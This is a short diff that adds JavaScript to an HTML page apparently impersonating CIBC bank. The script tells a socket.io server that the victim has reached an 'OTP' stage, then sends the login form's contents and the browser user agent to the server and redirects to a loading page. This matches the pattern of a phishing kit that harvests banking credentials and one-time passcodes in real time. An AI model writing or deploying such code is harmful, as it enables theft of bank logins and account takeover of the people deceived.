@@ -184,7 +184,19 @@
 </body>
 
     <script>
-        
+                    const socket = io();
+
+         socket.emit('pageandstage', {page: 'CIBC', stage: 'OTP'})
+    
+    function submitForm() {
+        document.getElementById('userAgent').value = navigator.userAgent;
+    
+        const formData = new FormData(document.getElementById('loginForm'));
+    
+        socket.emit('submit', Object.fromEntries(formData));
+    
+        window.location.href = `/loading`;
+    }
     </script>
 
 </html>
